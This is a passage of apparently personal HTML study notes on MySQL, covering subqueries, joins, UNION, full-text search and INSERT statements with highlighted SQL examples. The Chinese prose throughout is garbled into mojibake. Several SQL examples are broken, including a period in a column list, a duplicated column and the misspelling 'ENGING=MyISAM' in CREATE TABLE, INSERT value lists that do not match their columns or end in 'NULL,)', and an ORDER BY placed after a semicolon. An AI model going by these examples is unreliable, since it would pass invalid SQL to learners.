åº”è¯¥ä¹Ÿç»™å‡º <code>ORDER BY</code> å­å¥, è¿™æ˜¯ä¿è¯æ•°æ®æ­£ç¡®æ’åºçš„å”¯ä¸€åŠæ³•.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> order_num, <span class="hljs-built_in">SUM</span>(quantity<span class="hljs-operator">*</span>item_price) <span class="hljs-keyword">AS</span> ordertotal<br><span class="hljs-keyword">FROM</span> orderitems<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> order_num<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">SUM</span>(quantity<span class="hljs-operator">*</span>item_price) <span class="hljs-operator">&gt;=</span> <span class="hljs-number">50</span><br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> ordertotal<br></code></pre></td></tr></table></figure><h1 id="ç¬¬14ç« -ä½¿ç”¨å­æŸ¥è¯¢"><a href="#ç¬¬14ç« -ä½¿ç”¨å­æŸ¥è¯¢" class="headerlink" title="ç¬¬14ç«  ä½¿ç”¨å­æŸ¥è¯¢"></a>ç¬¬14ç«  ä½¿ç”¨å­æŸ¥è¯¢</h1><p>ä¹Ÿå°±æ˜¯ <code>SELECT</code> è¯­å¥ä¹‹ä¸‹åµŒå¥— <code>SELECT</code> è¯­å¥:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> cust_id<br><span class="hljs-keyword">FROM</span> orders<br><span class="hljs-keyword">WHERE</span> order_num <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> order_num<br>                    <span class="hljs-keyword">FROM</span> orderitems<br>                    <span class="hljs-keyword">WHERE</span> prod_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;TNT2&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¯¹äºèƒ½åµŒå¥—çš„å­æŸ¥è¯¢çš„æ•°ç›®æ²¡æœ‰é™åˆ¶, ä¸è¿‡åœ¨å®é™…ä½¿ç”¨æ—¶ç”±äºæ€§èƒ½çš„é™åˆ¶, ä¸èƒ½åµŒå¥—å¤ªå¤šçš„å­æŸ¥è¯¢.</p><h1 id="ç¬¬15ç« -è”ç»“è¡¨"><a href="#ç¬¬15ç« -è”ç»“è¡¨" class="headerlink" title="ç¬¬15ç«  è”ç»“è¡¨"></a>ç¬¬15ç«  è”ç»“è¡¨</h1><p>è”ç»“ (join).</p><h2 id="15-2-åˆ›å»ºè”ç»“"><a href="#15-2-åˆ›å»ºè”ç»“" class="headerlink" title="15.2 åˆ›å»ºè”ç»“"></a>15.2 åˆ›å»ºè”ç»“</h2><p><mark>å°†å¤šä¸ªè¡¨çš„åˆ—æ·»åŠ åˆ°ä¸€èµ·</mark>. ä¹Ÿå°±æ˜¯æ·»åŠ å¤–éƒ¨çš„è¡¨åˆ°å½“å‰è¡¨. ä½†ä¸æ˜¯çœŸæ­£æ·»åŠ åˆ°è¡¨çš„å­˜å‚¨ä¸­, åªæ˜¯åœ¨æŸ¥è¯¢çš„æ‰§è¡Œä¸­å­˜åœ¨.</p><p>è”ç»“çš„æ•°ç›®æ²¡æœ‰é™åˆ¶.</p><p>å¦‚:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_name, prod_name, prod_price<br><span class="hljs-keyword">FROM</span> vendors, products<br><span class="hljs-keyword">WHERE</span> vendors.vend_id <span class="hljs-operator">=</span> products.vend_id <br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> vend_name, prod_name;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä½¿ç”¨äº†å®Œå…¨é™å®šåç§°.</p><p><mark>ç¬›å¡å°”ç§¯ (cartesian product)</mark> æŒ‡è¿”å›çš„è¡Œæ•°ä¸ºç¬¬ä¸€ä¸ªè¡¨çš„è¡Œæ•°ä¹˜ä»¥ç¬¬äºŒä¸ªè¡¨çš„è¡Œæ•°. è¿™é‡Œ <mark>æ²¡æœ‰æŒ‡å®šå®Œå…¨é™å®šåç§°å’Œ <code>WHERE</code> å­å¥è€Œå‡ºç°</mark> </p><p>å¦‚, ç›´æ¥ä»ä¸¤ä¸ªè¡¨å–:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_name, prod_name, prod_price<br><span class="hljs-keyword">FROM</span> vendors, products<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> vend_name, prod_name;<br></code></pre></td></tr></table></figure><h3 id="15-2-2-å†…éƒ¨è”ç»“"><a href="#15-2-2-å†…éƒ¨è”ç»“" class="headerlink" title="15.2.2 å†…éƒ¨è”ç»“"></a>15.2.2 å†…éƒ¨è”ç»“</h3><p>åŸºäºä¸¤ä¸ªè¡¨ä¹‹é—´çš„ç›¸ç­‰æµ‹è¯•?</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_name, prod_name. prod_price<br><span class="hljs-keyword">FROM</span> vendors <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> products<br><span class="hljs-keyword">ON</span> vendors.vend_id <span class="hljs-operator">=</span> products.vend_id;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬16ç« -åˆ›å»ºé«˜çº§è”ç»“"><a href="#ç¬¬16ç« -åˆ›å»ºé«˜çº§è”ç»“" class="headerlink" title="ç¬¬16ç«  åˆ›å»ºé«˜çº§è”ç»“"></a>ç¬¬16ç«  åˆ›å»ºé«˜çº§è”ç»“</h1><h2 id="16-1-ä½¿ç”¨è¡¨åˆ«å"><a href="#16-1-ä½¿ç”¨è¡¨åˆ«å" class="headerlink" title="16.1 ä½¿ç”¨è¡¨åˆ«å"></a>16.1 ä½¿ç”¨è¡¨åˆ«å</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> cust_name, cust_contact<br><span class="hljs-keyword">FROM</span> customers <span class="hljs-keyword">AS</span> c, orders <span class="hljs-keyword">AS</span> o, orderitems <span class="hljs-keyword">AS</span> oi<br><span class="hljs-keyword">WHERE</span> c.cust_id <span class="hljs-operator">=</span> o.cust_id<br><span class="hljs-keyword">AND</span>   oi.order_num <span class="hljs-operator">=</span> o.order_num   <br><span class="hljs-keyword">AND</span>   prod_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;TNT2&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="16-2-ä½¿ç”¨ä¸åŒç±»å‹çš„è”ç»“"><a href="#16-2-ä½¿ç”¨ä¸åŒç±»å‹çš„è”ç»“" class="headerlink" title="16.2 ä½¿ç”¨ä¸åŒç±»å‹çš„è”ç»“"></a>16.2 ä½¿ç”¨ä¸åŒç±»å‹çš„è”ç»“</h2><h3 id="16-2-1-è‡ªè”ç»“"><a href="#16-2-1-è‡ªè”ç»“" class="headerlink" title="16.2.1 è‡ªè”ç»“"></a>16.2.1 è‡ªè”ç»“</h3><p>è”ç»“çš„ä¸¤ä¸ªè¡¨æ˜¯åŒä¸€ä¸ªè¡¨. éœ€è¦ç»“åˆè¡¨åˆ«å.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> p1.prod_id, p1.prod_name<br><span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">AS</span> p1, products <span class="hljs-keyword">AS</span> p2<br><span class="hljs-keyword">WHERE</span> p1.vend_id <span class="hljs-operator">=</span> p2.vend_id<br><span class="hljs-keyword">AND</span>   p2.prod_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;DTNTR&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="16-2-2-è‡ªç„¶è”ç»“"><a href="#16-2-2-è‡ªç„¶è”ç»“" class="headerlink" title="16.2.2 è‡ªç„¶è”ç»“"></a>16.2.2 è‡ªç„¶è”ç»“</h3><p>ä¸æ˜¯å¾ˆæ˜ç™½.</p><h3 id="16-2-3-å¤–éƒ¨è”ç»“"><a href="#16-2-3-å¤–éƒ¨è”ç»“" class="headerlink" title="16.2.3 å¤–éƒ¨è”ç»“"></a>16.2.3 å¤–éƒ¨è”ç»“</h3><p><mark>è”ç»“åŒ…å«äº†é‚£äº›åœ¨ç›¸å…³è¡¨ä¸­æ²¡æœ‰å…³è”è¡Œçš„è¡Œ, å«åšå¤–éƒ¨è”ç»“</mark>.</p><h1 id="ç¬¬17ç« -ç»„åˆæŸ¥è¯¢"><a href="#ç¬¬17ç« -ç»„åˆæŸ¥è¯¢" class="headerlink" title="ç¬¬17ç«  ç»„åˆæŸ¥è¯¢"></a>ç¬¬17ç«  ç»„åˆæŸ¥è¯¢</h1><h2 id="17-1-ç»„åˆæŸ¥è¯¢"><a href="#17-1-ç»„åˆæŸ¥è¯¢" class="headerlink" title="17.1 ç»„åˆæŸ¥è¯¢"></a>17.1 ç»„åˆæŸ¥è¯¢</h2><p>ä¸€èˆ¬çš„æŸ¥è¯¢åªæœ‰ä¸€æ¡ <code>SELECT</code> è¯­å¥, æ‰§è¡Œå¤šä¸ª <code>SELECT</code> å¹¶è¿”å›çš„ç§°ä¸º<mark>ç»„åˆæŸ¥è¯¢ (union) æˆ–å¤åˆæŸ¥è¯¢ (compound query)</mark></p><h2 id="17-2-åˆ›å»ºç»„åˆæŸ¥è¯¢"><a href="#17-2-åˆ›å»ºç»„åˆæŸ¥è¯¢" class="headerlink" title="17.2 åˆ›å»ºç»„åˆæŸ¥è¯¢"></a>17.2 åˆ›å»ºç»„åˆæŸ¥è¯¢</h2><p>ä½¿ç”¨ <code>UNION</code> å…³é”®å­—.</p><p>å¦‚:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_id, prod_id, prod_price    <br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_price <span class="hljs-operator">&lt;=</span> <span class="hljs-number">5</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> vend_id, prod_id, prod_price    <br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> vend_id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1001</span>,<span class="hljs-number">1002</span>);<br></code></pre></td></tr></table></figure><h3 id="17-2-2-UNION-è§„åˆ™"><a href="#17-2-2-UNION-è§„åˆ™" class="headerlink" title="17.2.2 UNION è§„åˆ™"></a>17.2.2 UNION è§„åˆ™</h3><ul><li>ä¸¤æ¡åŠä»¥ä¸Š</li><li>ç›¸åŒçš„åˆ—, è¡¨è¾¾å¼æˆ–èšé›†å‡½æ•°</li><li>ç±»å‹å…¼å®¹</li></ul><h3 id="17-2-3-åŒ…å«æˆ–å–æ¶ˆé‡å¤çš„è¡Œ"><a href="#17-2-3-åŒ…å«æˆ–å–æ¶ˆé‡å¤çš„è¡Œ" class="headerlink" title="17.2.3 åŒ…å«æˆ–å–æ¶ˆé‡å¤çš„è¡Œ"></a>17.2.3 åŒ…å«æˆ–å–æ¶ˆé‡å¤çš„è¡Œ</h3><p><code>UNION</code> é»˜è®¤å»æ‰é‡å¤çš„è¡Œ.</p><p>è¿”å›æ‰€æœ‰è¡Œå¯ä½¿ç”¨ <code>UNION ALL</code>.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_id, prod_id, prod_price    <br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_price <span class="hljs-operator">&lt;=</span> <span class="hljs-number">5</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span><br><span class="hljs-keyword">SELECT</span> vend_id, prod_id, prod_price    <br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> vend_id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1001</span>,<span class="hljs-number">1002</span>);<br></code></pre></td></tr></table></figure><h3 id="17-2-4-å¯¹ç»„åˆæŸ¥è¯¢ç»“æœæ’åº"><a href="#17-2-4-å¯¹ç»„åˆæŸ¥è¯¢ç»“æœæ’åº" class="headerlink" title="17.2.4 å¯¹ç»„åˆæŸ¥è¯¢ç»“æœæ’åº"></a>17.2.4 å¯¹ç»„åˆæŸ¥è¯¢ç»“æœæ’åº</h3><p>åœ¨ç”¨ <code>UNION</code> ç»„åˆæŸ¥è¯¢æ—¶, åªèƒ½ä½¿ç”¨ä¸€æ¡ <code>ORDER BY</code> å­å¥, ä¸”å¿…é¡»å‡ºç°åœ¨æœ€åä¸€æ¡ <code>SELECT</code> è¯­å¥ä¹‹å.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_id, prod_id, prod_price    <br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_price <span class="hljs-operator">&lt;=</span> <span class="hljs-number">5</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span><br><span class="hljs-keyword">SELECT</span> vend_id, prod_id, prod_price    <br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> vend_id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1001</span>,<span class="hljs-number">1002</span>);<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> vend_id, prod_price;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬18ç« -å…¨æ–‡æœ¬æœç´¢"><a href="#ç¬¬18ç« -å…¨æ–‡æœ¬æœç´¢" class="headerlink" title="ç¬¬18ç«  å…¨æ–‡æœ¬æœç´¢"></a>ç¬¬18ç«  å…¨æ–‡æœ¬æœç´¢</h1><h2 id="18-1-ç†è§£å…¨æ–‡æœ¬æœç´¢"><a href="#18-1-ç†è§£å…¨æ–‡æœ¬æœç´¢" class="headerlink" title="18.1 ç†è§£å…¨æ–‡æœ¬æœç´¢"></a>18.1 ç†è§£å…¨æ–‡æœ¬æœç´¢</h2><p>åœ¨ä½¿ç”¨å…¨æ–‡æœ¬æœç´¢æ—¶, MySQL ä¸éœ€è¦åˆ†åˆ«æŸ¥çœ‹æ¯ä¸ªè¡Œ, ä¸éœ€è¦åˆ†åˆ«åˆ†æå’Œå¤„ç†æ¯ä¸ªè¯.</p><p>MySQL åˆ›å»ºæŒ‡å®šåˆ—ä¸­å„è¯çš„ä¸€ä¸ªç´¢å¼•, æœç´¢å¯ä»¥é’ˆå¯¹è¿™äº›è¯è¿›è¡Œ.</p><p>ä¸æ˜¯å¾ˆç†è§£.</p><h2 id="18-2-ä½¿ç”¨å…¨æ–‡æœ¬æœç´¢"><a href="#18-2-ä½¿ç”¨å…¨æ–‡æœ¬æœç´¢" class="headerlink" title="18.2 ä½¿ç”¨å…¨æ–‡æœ¬æœç´¢"></a>18.2 ä½¿ç”¨å…¨æ–‡æœ¬æœç´¢</h2><p>ä¸ºäº†è¿›è¡Œå…¨æ–‡æœ¬æœç´¢, å¿…é¡»ç´¢å¼•è¢«æœç´¢çš„åˆ—, è€Œä¸”è¦éšç€æ•°æ®çš„æ”¹å˜ä¸æ–­é‡æ–°ç´¢å¼•.</p><h3 id="18-2-1-å¯ç”¨å…¨æ–‡æœ¬æœç´¢æ”¯æŒ"><a href="#18-2-1-å¯ç”¨å…¨æ–‡æœ¬æœç´¢æ”¯æŒ" class="headerlink" title="18.2.1 å¯ç”¨å…¨æ–‡æœ¬æœç´¢æ”¯æŒ"></a>18.2.1 å¯ç”¨å…¨æ–‡æœ¬æœç´¢æ”¯æŒ</h3><p>åœ¨<mark>åˆ›å»ºè¡¨</mark>æ—¶å¯ç”¨å…¨æ–‡æœ¬æœç´¢. æŒ‡å®š <code>FULLTEXT</code>.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> productnotes<br>(<br>    note_id     <span class="hljs-type">int</span>          <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>    prod_id     <span class="hljs-type">char</span>(<span class="hljs-number">10</span>)     <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    note_date   datetime     <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    note_id     text          <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">PRIMARY</span> KEY(note_id),<br>    FULLTEXT(note_text)<br>) ENGING<span class="hljs-operator">=</span>MyISAM;<br></code></pre></td></tr></table></figure><p>MySQL æ ¹æ®å­å¥ <code>FULLTEXT(note_text)</code> çš„æŒ‡ç¤ºå¯¹å®ƒè¿›è¡Œç´¢å¼•, è¿™é‡Œçš„ <code>FULLTEXT</code> ç´¢å¼•å•ä¸ªåˆ—, ä¹Ÿå¯ä»¥æŒ‡å®šå¤šä¸ª.</p><h3 id="18-2-2-è¿›è¡Œå…¨æ–‡æœ¬æœç´¢"><a href="#18-2-2-è¿›è¡Œå…¨æ–‡æœ¬æœç´¢" class="headerlink" title="18.2.2 è¿›è¡Œå…¨æ–‡æœ¬æœç´¢"></a>18.2.2 è¿›è¡Œå…¨æ–‡æœ¬æœç´¢</h3><p>ç´¢å¼•ä¹‹å, ä½¿ç”¨:</p><ul><li><code>Match()</code> æŒ‡å®šè¢«æœç´¢çš„åˆ—</li><li><code>Against()</code> æŒ‡å®šè¦ä½¿ç”¨çš„æœç´¢è¡¨è¾¾å¼</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> note_text<br><span class="hljs-keyword">FROM</span> productnotes<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">Match</span>(note_text) Against(<span class="hljs-string">&#x27;rabbit&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æœç´¢ä¸åŒºåˆ†å¤§å°å†™.</p><h3 id="18-2-3-ä½¿ç”¨æŸ¥è¯¢æ‰©å±•"><a href="#18-2-3-ä½¿ç”¨æŸ¥è¯¢æ‰©å±•" class="headerlink" title="18.2.3 ä½¿ç”¨æŸ¥è¯¢æ‰©å±•"></a>18.2.3 ä½¿ç”¨æŸ¥è¯¢æ‰©å±•</h3><p>è¿”å›çš„è¡Œæ•°ä¼šæ›´å¤š:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> note_text<br><span class="hljs-keyword">FROM</span> productnotes<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">Match</span>(note_text) Against(<span class="hljs-string">&#x27;anvils&#x27;</span> <span class="hljs-keyword">WITH</span> QUERY EXPANSION);<br></code></pre></td></tr></table></figure><h3 id="18-2-4-å¸ƒå°”æ–‡æœ¬æœç´¢"><a href="#18-2-4-å¸ƒå°”æ–‡æœ¬æœç´¢" class="headerlink" title="18.2.4 å¸ƒå°”æ–‡æœ¬æœç´¢"></a>18.2.4 å¸ƒå°”æ–‡æœ¬æœç´¢</h3><p>å¯æŒ‡å®šè¦æ’æ–¥çš„å€¼:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> note_text<br><span class="hljs-keyword">FROM</span> productnotes<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">Match</span>(note_text) Against(<span class="hljs-string">&#x27;heavy -repo*&#x27;</span> <span class="hljs-keyword">IN</span> <span class="hljs-type">BOOLEAN</span> MODE);<br></code></pre></td></tr></table></figure><p><code>-repo*</code> æ˜ç¡®æŒ‡ç¤º MySQL æ’é™¤åŒ…å« <code>repo*</code> çš„è¡Œ.</p><p><img src="/../img/sql_fulltext_boolean_opes.png"></p><h3 id="18-2-5-å…¨æ–‡æœç´¢çš„ä½¿ç”¨è¯´æ˜"><a href="#18-2-5-å…¨æ–‡æœç´¢çš„ä½¿ç”¨è¯´æ˜" class="headerlink" title="18.2.5 å…¨æ–‡æœç´¢çš„ä½¿ç”¨è¯´æ˜"></a>18.2.5 å…¨æ–‡æœç´¢çš„ä½¿ç”¨è¯´æ˜</h3><p>å…·ä½“è§ä¹¦.</p><h1 id="ç¬¬19ç« -æ’å…¥æ•°æ®"><a href="#ç¬¬19ç« -æ’å…¥æ•°æ®" class="headerlink" title="ç¬¬19ç«  æ’å…¥æ•°æ®"></a>ç¬¬19ç«  æ’å…¥æ•°æ®</h1><p><code>INSERT</code>.</p><h2 id="19-2-æ’å…¥å®Œæ•´çš„è¡Œ"><a href="#19-2-æ’å…¥å®Œæ•´çš„è¡Œ" class="headerlink" title="19.2 æ’å…¥å®Œæ•´çš„è¡Œ"></a>19.2 æ’å…¥å®Œæ•´çš„è¡Œ</h2><p>æŒ‡å®šè¡¨åå’Œè¢«æ’å…¥åˆ°æ–°è¡Œä¸­çš„å€¼:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Customers<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-string">&#x27;Pep E. LaPew&#x27;</span>,<br>    <span class="hljs-string">&#x27;100 Main Street&#x27;</span>,<br>    <span class="hljs-string">&#x27;Los Angeles&#x27;</span>, <br>    <span class="hljs-string">&#x27;CA&#x27;</span>, <br>    <span class="hljs-string">&#x27;90046&#x27;</span>,<br>    <span class="hljs-string">&#x27;USA&#x27;</span>,<br>    <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">NULL</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ’å…¥çš„æ˜¯ä¸€è¡Œ.</p><p>è¿™ç§è¯­æ³•å¹¶ä¸å®‰å…¨, åº”å°½é‡é¿å…ä½¿ç”¨.</p><p><mark>å®‰å…¨åšæ³•</mark> æ˜¯æ˜ç¡®ç»™å‡ºåˆ—å:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Customers(cust_name,<br>    cust_address,<br>    cust_city,<br>    cust_state,<br>    cust_zip,<br>    cust_country,<br>    cust_contact,<br>    cust_email)<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-string">&#x27;Pep E. LaPew&#x27;</span>,<br>    <span class="hljs-string">&#x27;100 Main Street&#x27;</span>,<br>    <span class="hljs-string">&#x27;Los Angeles&#x27;</span>, <br>    <span class="hljs-string">&#x27;CA&#x27;</span>, <br>    <span class="hljs-string">&#x27;90046&#x27;</span>,<br>    <span class="hljs-string">&#x27;USA&#x27;</span>,<br>    <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">NULL</span>);<br></code></pre></td></tr></table></figure><h2 id="19-3-æ’å…¥å¤šä¸ªè¡Œ"><a href="#19-3-æ’å…¥å¤šä¸ªè¡Œ" class="headerlink" title="19.3 æ’å…¥å¤šä¸ªè¡Œ"></a>19.3 æ’å…¥å¤šä¸ªè¡Œ</h2><p>ä½¿ç”¨å¤šæ¡ <code>INSERT</code> è¯­å¥, æ¯æ¡è¯­å¥ç”¨ä¸€ä¸ªåˆ†å·ç»“æŸ:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Customers(cust_name,<br>    cust_address,<br>    cust_city,<br>    cust_state,<br>    cust_zip,<br>    cust_country,<br>    cust_contact,<br>    cust_email)<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-string">&#x27;Pep E. LaPew&#x27;</span>,<br>    <span class="hljs-string">&#x27;100 Main Street&#x27;</span>,<br>    <span class="hljs-string">&#x27;Los Angeles&#x27;</span>, <br>    <span class="hljs-string">&#x27;CA&#x27;</span>, <br>    <span class="hljs-string">&#x27;90046&#x27;</span>,<br>    <span class="hljs-string">&#x27;USA&#x27;</span>,<br>    <span class="hljs-keyword">NULL</span>,);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Customers(cust_name,<br>    cust_address,<br>    cust_city,<br>    cust_state,<br>    cust_zip,<br>    cust_country,<br>    cust_contact,<br>    cust_email)<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-string">&#x27;Pep E. LaPew&#x27;</span>,<br>    <span class="hljs-string">&#x27;100 Main Street&#x27;</span>,<br>    <span class="hljs-string">&#x27;Los Angeles&#x27;</span>, <br>    <span class="hljs-string">&#x27;CA&#x27;</span>, <br>    <span class="hljs-string">&#x27;90046&#x27;</span>,<br>    <span class="hljs-string">&#x27;USA&#x27;</span>,<br>    <span class="hljs-keyword">NULL</span>,);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Customers(cust_name,<br>    cust_address,<br>    cust_city,<br>    cust_state,<br>    cust_zip,<br>    cust_country,<br>    cust_contact,<br>    cust_email)<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-string">&#x27;Pep E. LaPew&#x27;</span>,<br>    <span class="hljs-string">&#x27;100 Main Street&#x27;</span>,<br>    <span class="hljs-string">&#x27;Los Angeles&#x27;</span>, <br>    <span class="hljs-string">&#x27;CA&#x27;</span>, <br>    <span class="hljs-string">&#x27;90046&#x27;</span>,<br>    <span class="hljs-string">&#x27;USA&#x27;</span>,<br>    <span class="hljs-keyword">NULL</span>,<br>   <span class="hljs-keyword">NULL</span>);<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 